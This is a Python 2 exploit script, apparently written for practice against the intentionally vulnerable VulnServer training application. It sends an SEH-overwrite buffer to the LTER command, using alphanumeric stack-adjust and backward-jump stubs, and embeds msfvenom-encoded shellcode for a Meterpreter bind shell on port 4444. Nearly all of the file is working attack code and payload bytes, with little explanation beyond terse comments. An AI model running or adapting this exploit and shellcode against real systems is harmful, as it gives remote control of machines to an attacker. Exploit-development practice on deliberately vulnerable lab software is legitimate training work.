#!/usr/bin/python
#
# Title: Exploit VULNSERVER - LTER - SEH
# Author: Samir Sanchez Garnica
# Date: 22/10/2019
# Software Link: https://github.com/exploitwritter/VULSERVER-LTER-SEH
# Vendor Homepage: N/A
# Version: N/A
# Tested on: Windows 10 PRO N
# CVE: N/A

import sys
import socket
import random
import string
import struct

def pattern_create(_type,_length):
  _type = _type.split(" ")

  if _type[0] == "trash":
    return _type[1] * _length
  elif _type[0] == "random":
    return ''.join(random.choice(string.lowercase) for i in range(_length))
  elif _type[0] == "pattern":
    _pattern = ''
    _parts = ['A', 'a', '0']
    while len(_pattern) != _length:
      _pattern += _parts[len(_pattern) % 3]
      if len(_pattern) % 3 == 0:
        _parts[2] = chr(ord(_parts[2]) + 1)
        if _parts[2] > '9':
          _parts[2] = '0'
          _parts[1] = chr(ord(_parts[1]) + 1)
          if _parts[1] > 'z':
            _parts[1] = 'a'
            _parts[0] = chr(ord(_parts[0]) + 1)
            if _parts[0] > 'Z':
              _parts[0] = 'A'
    return _pattern
  else:
    return "Not Found"

def pwned(_host, _port, _payload):
	print "[*] Conectandose a {0}:{1}...".format(_host, _port)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((_host, _port))
	print "[*] Conectado, Enviando payload {0} bytes...".format(len(_payload))
	_payload = "{0}\r\n".format(_payload)
	s.send(_payload)
	_data = s.recv(1024)
	s.shutdown
	s.close
	print 'Recibido:', repr(_data)
	print "[+] Payload de {0} bytes Enviado, Satisfactoriamente su payload ejecutado.".format(len(_payload))
 

def main():
  _host = "172.26.2.130"
  _port = 9999
  _offset_eip = 3550
  _break = 5000
  _nseh = struct.pack("<L",0xff774242) #  inc edx, inc edx ja -0x80 \x42\x42\x77\xff el \xff al restarse con 0x7f nos daria 0x80
  _seh =  struct.pack("<L",0x6250160A) #  pop esi # pop ebp # retn essfunc.dll 3 8 one-reg, stack ebp, esi  nonull, ascii
  _prepend_esp = "\x25\x41\x4D\x4E\x55\x25\x35\x32\x31\x2A\x54\x58\x2D\x70\x70\x7C\x7C\x2D\x20\x40\x43\x43\x2D\x28\x35\x40\x40\x50\x5C"
  _jmp_negative = "\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x05\x34\x72\x77\x77\x05\x23\x61\x66\x66\x05\x23\x52\x55\x55\x2D\x33\x33\x33\x33\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x05\x21\x21\x21\x75\x05\x20\x20\x20\x74\x50"
  _prepend_2_esp = "\x54\x58\x66\x2D\xFF\x0D\x50\x5C"


  _header = "LTER " + str(".")
  #msfvenom -p windows/meterpreter/bind_tcp LPORT=4444  -f c  EXITFUNC=seh BufferRegister=ESP -e x86/alpha_mixed
  _shellcode = ("\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
              "\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b"
              "\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
              "\x50\x38\x41\x42\x75\x4a\x49\x69\x6c\x6b\x58\x6c\x42\x63\x30"
              "\x57\x70\x73\x30\x55\x30\x6c\x49\x38\x65\x64\x71\x69\x50\x70"
              "\x64\x4e\x6b\x70\x50\x34\x70\x6e\x6b\x56\x32\x34\x4c\x4e\x6b"
              "\x72\x72\x45\x44\x6e\x6b\x52\x52\x74\x68\x76\x6f\x4c\x77\x72"
              "\x6a\x77\x56\x54\x71\x4b\x4f\x6c\x6c\x45\x6c\x63\x51\x63\x4c"
              "\x54\x42\x54\x6c\x71\x30\x4f\x31\x68\x4f\x34\x4d\x46\x61\x59"
              "\x57\x78\x62\x6c\x32\x72\x72\x73\x67\x4c\x4b\x72\x72\x74\x50"
              "\x6e\x6b\x62\x6a\x75\x6c\x4e\x6b\x32\x6c\x47\x61\x73\x48\x6a"
              "\x43\x51\x58\x57\x71\x6a\x71\x46\x31\x6e\x6b\x51\x49\x45\x70"
              "\x75\x51\x5a\x73\x6e\x6b\x47\x39\x47\x68\x69\x73\x37\x4a\x73"
              "\x79\x6c\x4b\x47\x44\x4c\x4b\x35\x51\x39\x46\x46\x51\x4b\x4f"
              "\x4c\x6c\x4a\x61\x6a\x6f\x54\x4d\x66\x61\x58\x47\x46\x58\x69"
              "\x70\x31\x65\x79\x66\x46\x63\x33\x4d\x78\x78\x35\x6b\x73\x4d"
              "\x71\x34\x50\x75\x39\x74\x46\x38\x6c\x4b\x71\x48\x34\x64\x56"
              "\x61\x5a\x73\x62\x46\x6c\x4b\x66\x6c\x50\x4b\x6c\x4b\x51\x48"
              "\x65\x4c\x57\x71\x7a\x73\x4c\x4b\x74\x44\x6e\x6b\x65\x51\x58"
              "\x50\x6d\x59\x32\x64\x65\x74\x54\x64\x73\x6b\x43\x6b\x50\x61"
              "\x51\x49\x43\x6a\x56\x31\x59\x6f\x6b\x50\x51\x4f\x53\x6f\x31"
              "\x4a\x6c\x4b\x45\x42\x6a\x4b\x6c\x4d\x73\x6d\x71\x78\x35\x63"
              "\x74\x72\x47\x70\x47\x70\x52\x48\x63\x47\x43\x43\x75\x62\x43"
              "\x6f\x63\x64\x30\x68\x42\x6c\x72\x57\x66\x46\x66\x67\x69\x6f"
              "\x79\x45\x58\x38\x6a\x30\x36\x61\x33\x30\x43\x30\x36\x49\x5a"
              "\x64\x50\x54\x32\x70\x33\x58\x55\x79\x6f\x70\x72\x4b\x63\x30"
              "\x6b\x4f\x58\x55\x31\x7a\x74\x4b\x36\x39\x30\x50\x5a\x42\x79"
              "\x6d\x62\x4a\x57\x71\x43\x5a\x36\x62\x35\x38\x6b\x5a\x54\x4f"
              "\x49\x4f\x49\x70\x69\x6f\x4a\x75\x4e\x77\x70\x68\x36\x62\x77"
              "\x70\x46\x71\x63\x6c\x4b\x39\x48\x66\x42\x4a\x64\x50\x66\x36"
              "\x71\x47\x72\x48\x59\x52\x59\x4b\x35\x67\x71\x77\x59\x6f\x68"
              "\x55\x4b\x35\x79\x50\x33\x45\x61\x48\x76\x37\x35\x38\x68\x37"
              "\x5a\x49\x54\x78\x39\x6f\x6b\x4f\x79\x45\x52\x77\x63\x58\x34"
              "\x34\x78\x6c\x65\x6b\x39\x71\x39\x6f\x7a\x75\x42\x77\x4d\x47"
              "\x43\x58\x64\x35\x70\x6e\x42\x6d\x33\x51\x69\x6f\x69\x45\x73"
              "\x5a\x47\x70\x71\x7a\x36\x64\x71\x46\x66\x37\x45\x38\x77\x72"
              "\x6b\x69\x6a\x68\x61\x4f\x49\x6f\x7a\x75\x4d\x53\x6b\x48\x75"
              "\x50\x43\x4e\x54\x6d\x6c\x4b\x45\x66\x42\x4a\x57\x30\x70\x68"
              "\x77\x70\x54\x50\x35\x50\x67\x70\x42\x76\x51\x7a\x75\x50\x51"
              "\x78\x42\x78\x49\x34\x63\x63\x58\x65\x6b\x4f\x6a\x75\x7a\x33"
              "\x71\x43\x63\x5a\x57\x70\x30\x56\x61\x43\x66\x37\x50\x68\x65"
              "\x52\x48\x59\x49\x58\x63\x6f\x69\x6f\x48\x55\x6f\x73\x4b\x48"
              "\x33\x30\x61\x6e\x63\x37\x46\x61\x68\x43\x61\x39\x4b\x76\x32"
              "\x55\x4d\x39\x49\x53\x4f\x4b\x39\x6e\x36\x6e\x76\x52\x68\x6a"
              "\x32\x4a\x73\x30\x30\x53\x6b\x4f\x78\x55\x52\x4a\x55\x50\x4a"
              "\x63\x41\x41")

  _inject = _header
  _inject += "A" * 13
  _inject += _prepend_2_esp
  _inject += "A" * 41
  _inject += _shellcode
  _inject += pattern_create("trash B", _offset_eip-len(_prepend_esp)-48-len(_jmp_negative)-len(_prepend_2_esp)-41-len(_shellcode))
 
  _inject += _prepend_esp
  _inject += _jmp_negative
  _inject += "C" * 35
  _inject += _nseh
  _inject += _seh
  _inject += pattern_create("trash D", _break-len(_inject))

  print(_inject)

  pwned(_host,_port,_inject)

if __name__ == "__main__":
    main()